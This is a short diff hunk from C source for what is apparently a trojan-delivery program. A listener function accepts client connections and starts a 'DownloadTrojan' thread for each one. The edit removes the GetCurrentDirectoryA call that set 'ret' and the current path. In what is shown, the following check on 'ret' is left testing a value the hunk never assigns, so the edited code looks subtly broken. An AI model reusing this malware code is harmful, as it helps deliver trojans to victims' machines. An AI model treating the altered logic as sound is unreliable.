@@ -40,7 +40,7 @@ DWORD __stdcall DownloadTrojanListener() {
 			NETWORKPROCPARAM stparam = { 0 };
 			stparam.stAddrClient = siclient;
 			stparam.hSockClient = sockclient;
-			ret = GetCurrentDirectoryA(MAX_PATH, stparam.szCurrentPath);
+
 			if (ret) {
 				HANDLE h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DownloadTrojan, &stparam, 0, 0);
 				CloseHandle(h);
